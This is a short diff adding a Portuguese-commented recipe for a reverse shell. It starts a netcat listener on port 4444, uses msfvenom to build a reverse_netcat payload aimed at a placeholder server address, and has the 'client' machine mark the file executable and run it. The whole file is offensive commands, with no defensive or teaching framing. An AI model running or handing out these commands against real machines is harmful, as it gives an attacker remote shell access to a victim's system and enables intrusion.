@@ -1,0 +1,11 @@
+#servidor iniciar primeiro
+#nc -lvnp 4444
+
+msfvenom -p cmd/unix/reverse_netcat lhost=ip_server lport=4444 R > nome.elf
+
+
+#cliente
+chmod +x nome.elf
+./nome.elf
+
+
